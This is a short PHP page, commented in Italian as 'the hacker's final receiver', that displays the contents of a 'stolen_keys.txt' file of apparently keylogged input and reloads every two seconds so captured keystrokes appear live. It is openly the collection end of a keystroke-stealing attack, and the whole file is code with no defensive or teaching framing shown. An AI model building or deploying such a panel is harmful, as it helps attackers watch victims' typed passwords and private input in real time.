<?php
// hacker_panel.php - Il ricevitore finale dell'hacker
$file_hacker = '/var/www/htmltxt/stolen_keys.txt';
?>
<!DOCTYPE html>
<html>
<head>
  <style>
    .terminal { border: 1px solid #0f0; padding: 20px; min-height: 200px; font-size: 18px;}
  </style>
</head>
<body>
  <h2>> Input registrati:</h2>
  
  <div class="terminal">
    <?php
    if (file_exists($file_hacker)) {
        // Legge e stampa i tasti rubati
        echo htmlspecialchars(file_get_contents($file_hacker));
    }
    ?>
  </div>
  
  <script>
      setTimeout(function(){ location.reload(); }, 2000);
  </script>
</body>
</html>